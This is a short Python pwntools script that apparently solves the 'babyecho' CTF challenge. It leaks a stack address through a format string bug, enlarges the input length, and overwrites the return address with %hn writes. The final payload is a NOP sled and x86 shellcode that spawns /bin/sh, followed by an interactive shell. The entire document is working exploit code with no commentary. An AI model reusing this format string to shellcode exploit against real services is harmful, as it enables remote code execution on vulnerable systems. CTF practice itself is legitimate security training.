from pwn import *

def send_data(data):
	r.sendlineafter("bytes\n", data)

# r = remote("0", 1234)
r = process("./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d")
fmt = "%%%dc%%%d$hn"

# raw_input("$ ")

send_data("%5$x")
stack = int(r.recv(8), 16)
exit_addr = stack - 0x04
ret_addr = stack + 0x410
length = stack - 0x0c
shellcode = stack + 0x30
log.info("stack : " + hex(stack))
send_data(p32(length) + "%99c%7$n")
send_data(p32(length) + "%1019c%7$n")
addr_list = [ret_addr, exit_addr]
rop_list = [shellcode, 1]
payload = p32(ret_addr) + p32(ret_addr + 2) + p32(exit_addr)
payload += fmt % ((shellcode & 0xffff) - len(payload), 7)
payload += fmt % (((shellcode >> 16) - (shellcode & 0xffff)) & 0xffff, 8)
payload += fmt % (6051, 9)
payload += '\x90' * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
send_data(payload)

r.interactive()